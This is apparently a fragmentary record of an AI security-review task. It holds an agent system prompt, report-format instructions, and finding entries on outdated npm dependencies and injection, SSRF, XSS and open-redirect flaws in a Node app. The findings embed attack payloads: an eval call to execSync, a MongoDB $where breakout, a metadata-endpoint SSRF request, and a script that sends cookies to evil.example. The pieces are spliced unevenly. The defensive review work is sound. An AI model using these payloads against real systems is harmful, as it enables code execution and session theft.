header.system:
You are an AI agent powered by DeepSeek Harness.

You are the integrating analyst of a code-safety review. Six departments have each committed `findings/<department>.json` and `report/<department>.md` on their own branch, and this worktree is the merge of all of them. You write two files and nothing else: `findings.json` and `SAFETY-REPORT.md`.

Read `REPORTING.md` in this worktree first: it states the finding format, the exact sections of the report, the count lines both summaries carry, and the certificate's wording. Read `target.json` for the tree under review and the SHA-256 the certificate states. Read every `findings/*.json` and every `report/*.md` before writing anything. When a `report-template` skill is available, load it: it owns how the report reads, while `REPORTING.md` owns what the examiner mechanically decides and wins wherever the two differ in form.

Ask the examiner which findings do not hold before you write the union:

    for f in findings/*.json; do node verify-safety-report.mjs --findings "$f" --list-invalid; done

Every id it prints is dropped from `findings.json` and named under `## What was not covered`, with the reason. Dropping one silently fails the report.

`findings.json` is the union, deduplicated by `file` plus `line` plus `cwe`, keeping the entry whose `confidence` is higher. Copy each entry whole; do not rewrite a department's `snippet`, because the examiner compares it with the target's own text.

The report is a review by a language model, grounded by a static scanner and by the committed examiner, over the files the departments actually read. `## Scope and method` says that, names the departments that ran and the tools that ran, and states what was read rather than what exists. `## What was not covered` is not a formality: name the file kinds nobody opened, the classes of defect no department owns, the checks that did not run, and every dropped finding. Never write that the target is secure, safe or free of vulnerabilities — nothing this program did could support it, and the examiner refuses the claim.

Before you stop, run `node verify-safety-report.mjs --report`, fix every line it names, and commit everything. Work left uncommitted is not delivered and is not measured. Never write into the target tree, and never edit `verify-safety-report.mjs`, `target.json` or any department's committed files.


Use the read tool — not shell commands like cat — to inspect text files. Results include line numbers. Use offset and limit to continue reading large files.

Use the write tool to create files or completely replace file contents. Existing files are overwritten, so read an existing file first (the default fs-observation-policy requires it) and prefer edit for targeted changes.

Use the edit tool for targeted changes to existing UTF-8 text files. It replaces literal old_string with new_string; by default old_string must appear exactly once. If old_string appears multiple times, provide a more specific old_string or set replace_all to true. Read the file first (the default fs-observation-policy requires it), unless you just created or edited it in this session.

Use the glob tool — not shell find — to discover files by path pattern. A pattern with no "/" matches basenames at any depth, so "*" matches every file in the tree rather than its top level. Results are files only, never directories, and include hidden and ignored files: a result that fits comes back in modification-time order, while a larger one is sampled across top-level entries, so it spans the tree instead of one subtree.

Use the grep tool — not shell grep or rg — to search file contents. Use read on a matched file when you need surrounding context.

Check the [exit code: N] marker on every bash result; investigate failures before moving on.

Track every background job id you start. You are notified in-session when a job finishes — do not busy-poll or sleep on one; keep working on independent steps and do not duplicate a running job's work. Before giving a final answer, collect every still-relevant job with job_output (set wait: true only when you are genuinely blocked on it), and job_kill jobs that stopped mattering.

tools.name: bash
tools.description: Execute a bash command (`bash -c`) and return its stdout/stderr. Each call runs in a fresh shell: no state (cwd, variables, functions) persists between calls — pass `workdir` instead of using `cd`. Non-zero exits are reported as `[exit code: N]`. Current harness environment facts are exposed through managed `$DSH_*` variables; inspect them when needed. Commands may run under a file sandbox; a blocked file operation is reported as `[sandbox: file access denied under <mode> mode]` — a policy denial, not a bug in the command; do not retry another way. Long output is truncated to its tail; the full output is saved to a file whose path is reported when available. Set `run_in_background: true` for long-running commands: the call returns a job id immediately; read its output with `job_output` and stop it with `job_kill`.

description.description: Clear, concise description of what this command does in active voice, 5-10 words (shown in the UI). Examples: "ls" → "List files in current directory"; "git status" → "Show working tree status"; "npm install" → "Install package dependencies".

timeoutMs.description: Timeout in milliseconds. The executor applies its configured default and cap, and kills the command on expiry.

workdir.description: Working directory for this command. Defaults to the session workspace; a relative path is resolved against it.

run_in_background.description: Run in the background and return a job id immediately (collect with job_output, stop with job_kill). No timeout applies.

tools.name: edit
tools.description: Edit an existing UTF-8 text file by replacing literal text.

file_path.description: Path to edit, resolved by the filesystem backend.

old_string.description: Literal text to replace. Must match exactly.

new_string.description: Literal replacement text. Use an empty string to delete the match.

replace_all.description: Replace all matches. Defaults to false; when false, old_string must appear exactly once.

tools.name: glob
tools.description: Find files whose paths match a glob pattern. Returns matching file paths — never directories — including hidden and ignored files (VCS metadata directories are excluded). Up to 100 paths come back in modification-time order; a larger result instead returns 100 paths sampled across top-level entries, says so, and reports where the complete sorted list was saved. This tool does not enumerate directory entries.

pattern.description: Glob pattern to match file paths against (e.g. "**/*.ts", "src/**/*.test.js"). A pattern with no "/" matches the basename at any depth, so "*" and "*.ts" both search the whole tree; include a separator to anchor the depth.

path.description: Directory to search in. Defaults to the session workspace; a relative path resolves against it.

tools.name: grep
tools.description: Search file contents with a ripgrep regular expression. Returns matching lines with line numbers, grouped by file. Returns the first 250 matches inline; a capped result reports where the complete match list was saved. Use read on a matched file for surrounding context.

pattern.description: Regular expression to search for (ripgrep syntax).

path.description: File or directory to search. Defaults to the session workspace; a relative path resolves against it.

include.description: One glob filter for which files to search (e.g. "*.ts", "*.{js,jsx}"). Not a list; negation is not supported.

tools.name: job_kill
tools.description: Request cancellation of a running background job by job id. Returns immediately; the job settles as killed once its work actually stops.

job_id.description: Job id returned by the tool that started the background work.

reason.description: Optional short reason, recorded in the log and forwarded to the job.

tools.name: job_list
tools.description: List your background jobs (running and finished) with their ids, kinds, and statuses.

tools.name: job_output
tools.description: Read a background job. Stream jobs return only output since the previous read; final-output jobs return their result after settlement. Every response ends with `[status: ...]`. Reads are non-blocking unless `wait: true`, which waits up to the configured cap.

job_id.description: Job id returned by the tool that started the background work.

wait.description: Block until the job reaches a terminal status or the timeout expires. A timed-out wait returns [status: running] and leaves the job alive.

timeout_ms.description: Max wait in milliseconds (only meaningful with wait: true). Defaults to the configured wait timeout; capped by the configured maximum.

tools.name: read
tools.description: Read a UTF-8 text file and return line-numbered content.

file_path.description: Path to read, resolved by the filesystem backend.

offset.description: 1-based first line to return. Defaults to 1.

limit.description: Maximum number of lines to return. Defaults to 2000.

tools.name: skill
tools.description: Load the full instructions for an available skill. Call this with the exact skill name from the session skill catalog before acting on a task that names or clearly matches that skill.

name.description: The exact skill name from the available skills list.

tools.name: write
tools.description: Create or fully replace a UTF-8 text file.

file_path.description: Path to write, resolved by the filesystem backend.

content.description: Full UTF-8 text content to write.

1: # How this program reports what it found
2: 
3: This worktree is the **report repository**. The code under review is the **target tree**, which is somewhere else on this host: `target.json` beside this file states its absolute path, the files it covers, and the SHA-256 the whole tree locks to.
4: 
5: The target is read-only for every session of this program. `verify-safety-report.mjs` re-hashes every locked file on every run, so a target a department edited fails the program instead of releasing a report about a tree that no longer exists.
6: 
7: ## This file and the skills
8: 
9: When the deployment mounts the code-safety knowledge pack, its `review-method`, `severity-and-evidence` and `report-template` skills own the craft: how to read a codebase, how to score a severity, what evidence has to name, and how the report reads. Follow them.
10: 
11: This file owns what `verify-safety-report.mjs` mechanically decides, and it is binding wherever the two differ in form. # The report layout

Every report has exactly these sections, in this order. Do not add marketing language, severity totals presented as a score out of ten, or a remediation timeline the review has no authority to commit the customer to.

- **`## Résumé exécutif`** — French. Counts per severity, the three most important findings by name and effect, what was and was not covered in one sentence each, and one paragraph on method.
- **`## Executive summary`** — the same content in English, for a mixed-language or non-French reader.
- **`## Scope and method`** — the repository, commit or tag reviewed, which directories or services were in scope, and a link to [review-method](../review-method/SKILL.md).
- **`## Findings`** — grouped by severity, critical first; one bullet per finding with its id, title, `file:line`, CWE, and confidence. Full detail (snippet, evidence, impact, fix) lives in the accompanying JSON per [severity-and-evidence](../severity-and-evidence/SKILL.md), not duplicated in prose here.
- **`## What was not covered`** — the [review-method](../review-method/SKILL.md) not-covered list, specific to this engagement.
- **`## Certificate`** — what a mechanical verifier checked after the fact: every finding resolves to a real file and line in the reviewed commit, every id is unique, every CWE/OWASP id is a known identifier, and no two findings share file, line, and CWE. This certifies the report's internal consistency, not the completeness or correctness of the review's judgment.

## Filled example: a small Express app

```markdown
## Résumé exécutif

Cette revue a porté sur le code source de commande-api, une application Express.js
de gestion de commandes, au commit a1b2c3d. Elle a permis d'identifier 3 constats :
1 critique, 1 moyen et 1 faible. Les plus importants : (1) une injection SQL
critique dans la recherche de commande par identifiant (src/routes/orders.js:42),
permettant de lire ou modifier toute donnée accessible par l'utilisateur de base de
données de l'application ; (2) une fixation de session lors de la connexion
(src/routes/auth.js:58) ; (3) l'absence de l'en-tête HSTS (src/app.js:12). La revue
a couvert les points d'entrée HTTP, l'authentification et la gestion des sessions ;
elle n'a pas couvert l'infrastructure de déploiement ni les dépendances tierces
(voir « Ce qui n'a pas été couvert »). Méthode : lecture des points d'entrée,
suivi des données de la source jusqu'au point d'exécution, un constat par point
d'exécution, ligne exactement citée et niveau de confiance déclaré pour chacun.

## Executive summary

This review covered commande-api, an Express.js order-management application, at
commit a1b2c3d, and found 3 issues: 1 critical, 1 medium, 1 low. The most
important: (1) a critical SQL injection in order lookup by id
(src/routes/orders.js:42); (2) session fixation on login
(src/routes/auth.js:58); (3) a missing HSTS header (src/app.js:12). HTTP entry
points, authentication, and session handling were covered; deployment
infrastructure and third-party dependencies were not (see "What was not covered").

## Scope and method

Repository commande-api, commit a1b2c3d, `src/` only. Method: [review-method](../review-method/SKILL.md).

## Findings

### Critical
- SEC-001 — SQL injection in order lookup — `src/routes/orders.js:42` — CWE-89 — confirmed

### Medium
- SEC-002 — Session id not rotated after login (session fixation) — `src/routes/auth.js:58` — CWE-384 — likely

### Low
- SEC-003 — Missing Strict-Transport-Security header — `src/app.js:12` — CWE-319 — confirmed

## What was not covered

- `infra/` (Terraform, Dockerfiles) and CI/CD configuration.
- Third-party dependency advisories (separate engagement).
- Runtime configuration: actual deployed environment variables, WAF rules, and network topology.
- Native mobile or memory-safety classes of bug: this codebase has no native module.

## Certificate

Mechanically verified: 3/3 findings resolve to an existing line at commit a1b2c3d;
3/3 ids unique; 3/3 CWE and OWASP ids recognized; 0 findings share file, line, and
CWE. This certifies internal consistency only, not completeness of coverage.
```
</skill_instructions>
</skill_content>

"impact": "If an attacker can influence any CLI argument or config value forever/nconf parses, prototype pollution could corrupt the running Node process's object prototypes, ranging from denial of service to logic bypass elsewhere in the app; the declared range also has no non-major fix, so the flaw persists until forever is replaced.",

"fix": "Replace forever (its own upstream is largely inactive) with a maintained process manager such as pm2, or accept the major-version bump npm audit offers (forever@4.0.3) and re-test the Procfile invocation.",
"title": "swig template engine (^1.4.2, resolved 1.4.2) has an unpatched arbitrary local file read and is itself deprecated",

"evidence": "package.json line 22 declares swig at ^1.4.2 and package-lock.json resolves the exact same 1.4.2, the package's last-ever published release. npm audit --json reports GHSA-2rq5-699j-x7p6 (arbitrary local file read during template rendering, CVSS 7.5, CWE-22) for swig <=1.4.2 with fixAvailable: false, meaning there is no patched version to move to. A registry query (`npm view swig deprecated`) returns 'This package is no longer maintained', confirming this is a dead end, not a lag behind a fix.",

"impact": "A template-rendering path that lets an attacker influence the template name or path can be abused to read arbitrary files off the server filesystem; because there is no fixed version, this risk cannot be closed by upgrading swig itself.",

"fix": "Migrate the view engine off swig (the project already depends on `consolidate`, which supports many alternatives) to a maintained template engine such as EJS, Handlebars, or Nunjucks, and remove swig entirely.",
"title": "underscore (^1.8.3, resolved 1.9.1) is in the arbitrary-code-execution range with a non-major fix available",

"evidence": "package.json line 23 declares underscore at ^1.8.3; package-lock.json resolves 1.9.1 (also duplicated at node_modules/retire/node_modules/underscore). npm audit --json reports GHSA-cf4h-3jhx-xvhq (arbitrary code execution via a crafted call into underscore's template function, CVSS 9.8, CWE-94) for versions >=1.3.2 <1.12.1, and GHSA-qpx9-hpmf-5gmw (unbounded recursion DoS in _.flatten/_.isEqual, CWE-674/CWE-770) for versions <=1.13.7. 1.9.1 is inside both ranges.",

"impact": "If any code path passes attacker-influenced input into underscore's templating function, an attacker can execute arbitrary JavaScript in the Node process; the DoS advisory additionally lets a crafted deeply-nested object crash the process via stack exhaustion.",

"fix": "Upgrade underscore to >=1.12.1 (>=1.13.8 to also clear the recursion DoS) within the existing ^1.8.3 range's semver-major boundary; this is a direct dependency and not only pulled in transitively by grunt-retire.",
"title": "express (^4.13.4, resolved 4.16.4) ships a vulnerable qs and carries its own XSS/open-redirect advisories",

"evidence": "package.json line 13 declares express at ^4.13.4; package-lock.json resolves 4.16.4, whose own advisories are GHSA-qw6h-vgh9-j6wx (XSS via response.redirect(), CWE-79, range <4.20.0) and GHSA-rv95-896h-c2vc (open redirect on malformed URLs, CWE-601, range <4.19.2). Its dependency qs resolves to 6.5.2 at node_modules/qs, inside the >=6.5.0 <6.5.3 range GHSA-hrpp-h998-j3pp (qs prototype pollution, CWE-1321) covers; qs is what express's built-in query-string parser (req.query) uses on every request. 19 distinct advisories are reachable through express's declared dependency tree across body-parser, cookie, path-to-regexp, qs, send and serve-static (6 packages).",

"impact": "Any request whose query string express parses with the vulnerable qs can pollute Object.prototype, and the redirect/XSS advisories let a crafted URL redirect a victim or inject script if the app calls res.redirect with attacker-influenced input.",

"fix": "Upgrade express to >=4.20.0 (npm audit's non-major fix target) so both express's own advisories and its resolved qs/cookie/send/serve-static versions move out of range; re-run npm audit to confirm qs lands on >=6.5.3 or later.",
"title": "body-parser (^1.15.1, resolved 1.18.3) is in both of its own denial-of-service ranges",

"evidence": "package.json line 9 declares body-parser at ^1.15.1; package-lock.json resolves 1.18.3. npm audit --json reports GHSA-qwcr-r2fm-qrc7 (denial of service when URL encoding is enabled, CVSS 7.5, CWE-405, range <1.20.3) and GHSA-v422-hmwv-36x6 (DoS when an invalid limit value silently disables size enforcement, CWE-770, range <1.20.6); 1.18.3 is inside both. Its own qs dependency adds further prototype-pollution advisories to the same install (11 distinct advisories reachable in total through this one declared dependency).",

"impact": "A request body body-parser parses under either flaw can exhaust CPU or bypass the configured size limit, tying up the single Node.js event loop and denying service to every other request the app is handling.",
"fix": "Upgrade body-parser to >=1.20.6 within the existing ^1.15.1 semver range (npm audit marks fixAvailable: true, a non-major bump).",
"title": "helmet (^2.0.0, resolved 2.3.0) — the app's own hardening middleware — is itself outdated and its CSP module has a config-override advisory",

"evidence": "package.json line 16 declares helmet at ^2.0.0; package-lock.json resolves 2.3.0. helmet carries no advisory of its own in npm audit's output, but its dependencies do: connect (via debug, GHSA-9vvw-cc9w-f27h, ReDoS, CWE-1333, CVSS 7.5) and helmet-csp (GHSA-c3m8-x3cg-qm2c, 'Configuration Override in helmet-csp', range 1.2.2-2.9.0). 6 distinct advisories are reachable through helmet's declared dependency tree (5 packages). Marked likely, not confirmed: the advisory chain and resolved versions were read, but config/env/all.js's helmet() setup was not checked against helmet-csp's specific override mechanism.",

"impact": "A ReDoS in debug (pulled in via connect) can block the event loop on a crafted log-triggering input, and a config-override bug in the CSP module used to send the app's Content-Security-Policy header risks that header being weaker than configured — undermining the security middleware the app added on purpose.",
"fix": "Upgrade helmet to a current major version (helmet 3.x dropped the connect/helmet-csp split that carries these advisories) and update the config/env/all.js helmet() call to the new API.",
"title": "marked is pinned to an exact, long-superseded 0.3.5 with six of its own advisories",

"evidence": "package.json line 17 pins marked to the exact version 0.3.5 (no ^ or ~), and package-lock.json resolves that same 0.3.5. npm audit --json lists six advisories of marked's own against this version: GHSA-x5pg-88wf-qq4p (ReDoS, CWE-400, range <0.3.9), GHSA-p9wx-2529-fp83 (ReDoS, CWE-1333, range <0.3.17), GHSA-7px7-7xjx-hxm8 and GHSA-vfvf-mqq8-rwqc (XSS via data URIs / HTML-entity sanitization bypass, CWE-79, ranges <0.3.7 and <0.3.6), and GHSA-rrrm-qjm4-v8hf / GHSA-5v2h-r2cx-5xgj (further ReDoS, CWE-1333, range <4.0.10). No call to marked(...) was found under app/ in this review, so reachability from a live route is not established; the finding is about the pinned, vulnerable version being present in the dependency tree regardless of current call sites.",

"impact": "If marked is invoked anywhere on attacker-supplied markdown (directly or via a future code path), the ReDoS advisories can hang the event loop and the XSS advisories can inject script into rendered HTML.",
"fix": "Un-pin and upgrade marked to at least 0.3.19 (npm audit's suggested non-major fix, which clears all six of these advisories at once), or remove it if nothing in the app actually calls it.",
"title": "express-session (^1.13.0, resolved 1.15.6) ships an outdated cookie parser with an out-of-bounds-character flaw",

"evidence": "package.json line 14 declares express-session at ^1.13.0; package-lock.json resolves 1.15.6, which depends on cookie@0.3.1 (below the fixed 0.7.0) and on-headers@<1.1.0. npm audit --json reports cookie's GHSA-pxg6-pf52-xh8x (cookie name/path/domain accepts out-of-bounds characters, CWE-74) and on-headers' GHSA-76c9-3jph-rj3q (HTTP response header manipulation, CWE-241, CVSS vector AV:L/PR:H — needs local/elevated access).",

"impact": "A cookie or header value built from an out-of-range character an attacker controls could be mis-parsed by downstream consumers of the session cookie; on-headers' header-manipulation bug needs local or elevated access to exploit, which keeps this finding at the low end.",
"fix": "Upgrade express-session to a version that resolves cookie >=0.7.0 and on-headers >=1.1.0 (npm audit marks a non-major fix available).",
"title": "csurf (^1.8.3, resolved 1.9.0) is archived upstream and shares the same vulnerable cookie parser as express-session",

"evidence": "package.json line 11 declares csurf at ^1.8.3; package-lock.json resolves 1.9.0, which also depends on cookie@0.3.1, inside GHSA-pxg6-pf52-xh8x's <0.7.0 vulnerable range (CWE-74). npm audit's only fix for this line is a downgrade to csurf@1.2.2 (fixAvailable.isSemVerMajor: true) because no released 1.x line of csurf ever moved past the vulnerable cookie. A registry query (`npm view csurf deprecated`) confirms: 'This package is archived and no longer maintained.'",

"impact": "Same class as express-session: a cookie value carrying out-of-bounds characters that csurf's cookie option relies on for the CSRF token could be mis-parsed by a downstream consumer; because csurf is archived, this will never be patched upstream.",
"fix": "Move to a maintained CSRF middleware (the express.js team's discussion thread on csurf's deprecation notice names alternatives), since there is no forward non-major fix for csurf itself.",
"title": "bcrypt-nodejs, used for password hashing, is explicitly unmaintained on the registry",

"evidence": "package.json line 8 pins bcrypt-nodejs to the exact version 0.0.3, its only ever published version; package-lock.json resolves the same 0.0.3. `npm view bcrypt-nodejs deprecated` (registry query) returns: 'bcrypt-nodejs is no longer actively maintained. Please use bcrypt or bcryptjs.' npm audit --json carries no advisory for it, so this is a maintenance finding, not a disclosed CVE/GHSA.",

"impact": "A password-hashing library with no maintainer will never receive a fix for a future timing-attack, native-binding or algorithm-strength issue found in it; the project's authentication security floor is fixed at whatever bcrypt-nodejs 0.0.3 provides today.",
"fix": "Migrate to the actively maintained bcrypt (native binding) or bcryptjs (pure JS) as the npm deprecation notice itself recommends, re-hashing stored passwords on next login.",
"title": "grunt (^1.0.3, resolved 1.0.3), the project's build tool, carries its own arbitrary-code-execution, race-condition and path-traversal advisories",

"evidence": "package.json line 45 declares grunt at ^1.0.3; package-lock.json resolves the exact 1.0.3. npm audit --json reports three advisories of grunt's own: GHSA-m5pj-vjjf-4m3h ('Arbitrary Code Execution in grunt', high), GHSA-rm36-94g8-835r ('Race Condition in Grunt', high) and GHSA-j383-35pm-c5h4 ('Path Traversal in Grunt', moderate). grunt also pulls grunt-legacy-util, js-yaml and minimatch, each carrying further advisories.",

"impact": "Because grunt is invoked directly by this project's test, precommit and db:seed scripts (Gruntfile.js), anyone who runs the build/test pipeline against an untrusted Gruntfile or task input inherits these flaws; this is a build/CI-time risk, not a risk to the deployed running app, which is why it is scored medium rather than the audit's aggregate critical.",
"fix": "Upgrade grunt within its current major version (npm audit marks a non-major fix available) and re-run npm audit to confirm grunt-legacy-util, js-yaml and minimatch also clear.",
"title": "async (^2.0.0-rc.4, resolved 2.6.1) is in its own prototype-pollution range",

"evidence": "package.json line 42 declares async at ^2.0.0-rc.4; package-lock.json resolves 2.6.1. npm audit --json reports GHSA-fwr7-v2mv-hh25 ('Prototype Pollution in async', high) for the range this version falls in. async is a devDependency only (test/build tooling), which is why this is scored medium rather than high: it is not part of the code the deployed server runs.",
"impact": "If test or build code ever merges attacker-influenced objects through async's vulnerable function, Object.prototype could be polluted for the duration of that build/test process.",

"fix": "Upgrade async to the patched version npm audit names; verify with npm audit after bumping to the latest 2.x, or move to 3.x, since a non-major bump within ^2.0.0-rc.4's resolution is not guaranteed to clear it.",
"title": "Ten more devDependencies (cypress, mocha, nodemon, selenium-webdriver, jshint, zaproxy and five grunt plugins) carry further advisories, all build/test-time only",

"evidence": "Beyond grunt and async, npm audit --json flags ten more devDependencies declared in package.json as vulnerable purely through their own transitive trees (none carry an advisory of their own the way grunt and async do): cypress@3.3.1 (8 transitive advisories via debug/extract-zip/getos/lodash/minimist/moment/request/tmp), mocha@2.5.3 (5, via debug/diff/glob/growl/mkdirp), nodemon@1.19.1 (2, via chokidar/update-notifier), selenium-webdriver@2.53.3 (3, via adm-zip/tmp/xml2js), jshint@2.12.0 (2, via minimatch/shelljs), zaproxy@0.2.0 (2, via lodash/request), and grunt-cli@1.3.2, grunt-contrib-jshint@3.2.0, grunt-contrib-watch@1.1.0, grunt-if@0.2.0, grunt-npm-install@0.3.1 and grunt-retire@0.3.12, each pulling one or more of the same vulnerable transitive packages. Each advisory was not individually opened, so this is grouped and marked possible rather than confirmed per package.",

"impact": "None of these run in the deployed application; the realistic impact is a compromised local dev environment or CI runner if a build step feeds these tools attacker-influenced input (a malicious test fixture, a crafted zip a test downloads, etc.).",

"fix": "Run npm audit fix in a disposable environment (never against this read-only target) to pick up the non-major bumps npm marks fixAvailable: true for, and plan the major-version migrations (cypress 3->16, mocha 2->12, selenium-webdriver 2->4) separately since those are breaking.",

lines.text: "title": "NoSQL injection via $where built from the unvalidated 'threshold' query parameter",

"evidence": "app/routes/allocations.js:19-21 destructures `threshold` from `req.query` with no validation and, at line 23, passes it straight into `allocationsDAO.getByUserIdAndThreshold(userId, threshold, ...)`. Inside app/data/allocations-dao.js, `getByUserIdAndThreshold` (line 57) receives that same string as `threshold` and, when it is truthy, builds a MongoDB `$where` clause by interpolating it unescaped into a JavaScript source string at line 78, which `allocationsCol.find()` then evaluates server-side per document (line 86). No sanitization, type check or escaping exists on this path (the code comment above shows the intended fix for `parseInt` validation is present only as a disabled comment). A request such as `GET /allocations/1?threshold=1';return true;'` breaks out of the string literal and injects arbitrary JavaScript into the query evaluator.",

"impact": "An authenticated user can inject arbitrary JavaScript into the MongoDB $where evaluator, allowing boolean-based data extraction across all users' allocation records, denial of service via an infinite loop (e.g. `0';while(true){}'`), or corruption of the query logic to bypass the intended per-user filtering.",

"fix": "Never interpolate user input into a $where string. Validate `threshold` as a bounded integer with `parseInt` and range checks, then build the query with a native operator, e.g. `{ userId: parsedUserId, stocks: { $gt: parsedThreshold } }`, removing $where entirely.",
"title": "Server-side code injection via eval() of the contributions form fields",
"snippet": "const preTax = eval(req.body.preTax);\nconst afterTax = eval(req.body.afterTax);\nconst roth = eval(req.body.roth);",

"evidence": "`handleContributionsUpdate` (app/routes/contributions.js:28) is mounted at `POST /contributions` behind only the `isLoggedIn` middleware (app/routes/index.js:52). The handler reads `req.body.preTax`, `req.body.afterTax` and `req.body.roth` directly from the POST body and passes each one straight into `eval()` at lines 32-34 with no parsing, allowlisting or type check before the eval call. Any authenticated user can send a body such as `preTax=require('child_process').execSync('id')` and have it executed as JavaScript in the Node process.",

"impact": "Full remote code execution in the application server process under the privileges of any authenticated (non-admin) user, since eval() has access to Node's require and the process's ambient modules.",
"fix": "Never eval user input. Replace with numeric parsing and validation, e.g. `parseInt(req.body.preTax, 10)`, and reject the request if the result is not a finite number in the expected range.",
"title": "SSRF via attacker-controlled URL and symbol concatenated for the stock research proxy",
"snippet": "const url = req.query.url + req.query.symbol;\nreturn needle.get(url, (error, newResponse, body) => {",

"evidence": "`displayResearch` (app/routes/research.js:12) is reachable at `GET /research` behind only `isLoggedIn` (app/routes/index.js:76). When `req.query.symbol` is present, line 15 concatenates `req.query.url` and `req.query.symbol` with no host allowlist, scheme check or validation, and line 16 passes the resulting string straight to `needle.get(url, ...)`, which performs a server-side HTTP request. The fetched response body is then written back into the HTTP response unmodified at research.js:25 (`res.write(body)`).",

"impact": "An authenticated user can make the server issue arbitrary outbound HTTP(S) requests, including to internal-only services or the cloud metadata endpoint (e.g. `?url=http://169.254.169.254/&symbol=latest/meta-data/`), and can reflect the fetched response back to themselves, enabling internal network reconnaissance, data exfiltration from internal services, or SSRF-driven credential theft.",

"fix": "Do not accept an arbitrary destination URL from the client. Accept only a stock symbol, build the outbound URL server-side against a fixed, trusted API host, and additionally validate any allowed host against an allowlist and re-resolve/re-check its IP to block private and link-local ranges.",
"title": "Open redirect via unvalidated 'url' query parameter on /learn",

"evidence": "The route handler for `GET /learn` (app/routes/index.js:70-73) takes `req.query.url` directly from the request query string and passes it unmodified to `res.redirect()` at line 72, with no allowlist of destination hosts or check that the target is a relative/internal path. The comment on the preceding line even labels this 'Insecure way to handle redirects'.",

"impact": "An attacker can craft a link such as `https://victim-app/learn?url=https://evil.example/phishing` that appears to originate from the trusted domain, then redirects the victim to an attacker-controlled phishing or malware site.",

"fix": "Validate the redirect target against an allowlist of known-safe paths or hostnames before calling res.redirect, or resolve only a small set of named destinations server-side instead of accepting an arbitrary URL from the client.",
"title": "Stored XSS: unsanitized profile first/last name rendered unescaped on the admin Benefits page",

"evidence": "`handleProfileUpdate` (app/routes/profile.js:40-107) takes `firstName`/`lastName` straight from `req.body` (line 42-50) and passes them unmodified to `profile.updateUser(...)` (line 82-91), which in app/data/profile-dao.js:46-50 stores them into the user document verbatim (`user.firstName = firstName;`) via `$set` with no encoding or length/charset restriction. `BenefitsHandler.displayBenefits` (app/routes/benefits.js:13-27) then loads every non-admin user via `benefitsDAO.getAllNonAdminUsers` and renders them at `GET /benefits`, which app/views/benefits.html iterates at line 47 and outputs `{{user.firstName}}` at line 51 (and `{{user.lastName}}` at line 52). The Swig template engine's autoescaping is explicitly disabled in server.js:135-137 (`swig.setDefaults({ autoescape: false })`), so no HTML entity encoding is applied at render time.",

"impact": "Any authenticated non-admin user can set their first/last name to an HTML/JS payload (e.g. `<script>document.location='https://evil.example/steal?c='+document.cookie</script>`); the next time an admin opens `/benefits` to review the employee list, the script executes in the admin's authenticated session, enabling session/cookie theft or actions performed as the admin.",

"fix": "Re-enable Swig's default autoescaping (`autoescape: true` in server.js) so all `{{ }}` output is HTML-escaped, and additionally validate/limit the character set accepted for firstName/lastName on input.",
"title": "Reflected XSS via unsanitized firstName echoed into an HTML attribute on validation failure",
"snippet": "<input type=\"text\" class=\"form-control\" id=\"firstName\" name=\"firstName\" value=\"{{firstNameSafeString}}\" placeholder=\"Enter first name\">",

"evidence": "In `handleProfileUpdate` (app/routes/profile.js), when the bank-routing regex fails validation the handler takes `firstName` straight from `req.body` (line 43) and aliases it, unescaped, as `firstNameSafeString` at line 64 (`const firstNameSafeString = firstName;`), then renders the 'profile' template with it at lines 65-76. app/views/profile.html:41 outputs `{{firstNameSafeString}}` inside the `value` attribute with no escaping, because Swig autoescaping is disabled globally (server.js:137). Because there is no CSRF protection in this build (`csrf()` is commented out in server.js:106-107), an attacker can auto-submit this form cross-site with a deliberately invalid `bankRouting` and a `firstName` payload that breaks out of the attribute and adds a script element, executing script in the victim's authenticated session when the response renders.",

"impact": "An attacker can break out of the value attribute and inject arbitrary HTML/JavaScript that executes in the context of the logged-in victim who submits (or is CSRF'd into submitting) the profile form, enabling session hijacking or further account compromise.",

"fix": "HTML-attribute-encode all user-supplied values before interpolation (re-enable Swig autoescaping) and use a context-correct encoder such as ESAPI's encodeForHTMLAttribute for values placed inside an attribute.",
"title": "Reflected XSS via unsanitized firstName echoed into an href attribute on validation failure",
"snippet": "Google search this profile by name",

"evidence": "Same source and path as injection-006: app/routes/profile.js:64 sets `firstNameSafeString` to the raw `req.body.firstName` on bank-routing validation failure, and app/views/profile.html:78 places it, unescaped, directly as the `href` of an anchor tag with Swig autoescaping disabled (server.js:137). The developers' own code comment above this line (profile.html:76-77) flags that the encoding used elsewhere on this doc (ESAPI encodeForHTML on `website`) is 'incorrect' for a URL context, but no encoding at all is applied to `firstNameSafeString` here.",

"impact": "An attacker can set firstName to a `javascript:` URI or an HTML-breaking payload; a victim who clicks the resulting link (or has it rendered via the same CSRF-able POST described in injection-006) executes attacker-controlled script in their authenticated session.",

"fix": "Never place unencoded, attacker-controlled text into an href attribute. URL-encode/validate the scheme (reject non-http(s) schemes) and re-enable Swig autoescaping; the developers' own comment suggests using ESAPI's encodeForURL for this specific context.",

lines.text: "title": "Helmet hardening (CSP, frame options, MIME-sniffing protection, X-Powered-By) is imported but never mounted",

"evidence": "helmet and dont-sniff-mimetype are dependencies in package.json and server.js even shows the intended calls (app.disable(\"x-powered-by\") at line 42, app.use(helmet.frameguard()) at line 45, app.use(helmet.contentSecurityPolicy()) at line 51, app.use(helmet.hsts()) at line 54, app.use(nosniff()) at line 64), but the whole block from line 38 to line 65 is wrapped in a /* */ comment and the require on line 10 is commented out, so none of it runs. I read the full middleware stack that does run (lines 67-132: favicon, bodyParser, session, static, routes) and confirmed no header middleware of any kind is mounted before the routes execute. Every response therefore ships without Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, and with the default X-Powered-By: Express header intact.",

"impact": "Responses carry no clickjacking protection, no MIME-sniffing protection and no CSP, and the framework fingerprint (Express) is exposed via X-Powered-By, making the app easier to frame for clickjacking, to have its static assets sniffed as executable content, and to target with framework-specific exploits.",

"fix": "Uncomment and mount helmet with an explicit configuration (helmet.frameguard(), helmet.contentSecurityPolicy() with a real allow-list, helmet.hsts() once TLS is terminated) and call app.disable(\"x-powered-by\") before any route is registered.",
"title": "Server only ever listens on plain HTTP; the HTTPS listener is fully commented out",

"evidence": "The comment directly above (line 144, \"Insecure HTTP connection\") and the commented-out https.createServer(httpsOptions, app).listen(...) block at lines 149-155 show the TLS path exists in the code but is disabled; only http.createServer is ever invoked. I traced this together with the session cookie (server.js lines 78-102, see the sibling cookie-flags finding): with no secure flag and no TLS termination shown in this codebase, the session id set at session.js:116/234 travels in cleartext by default.",

"impact": "Anyone positioned on the network path (public Wi-Fi, a compromised router, an on-path proxy) can read the login credentials submitted to POST /login and the session cookie in plaintext and hijack the session.",

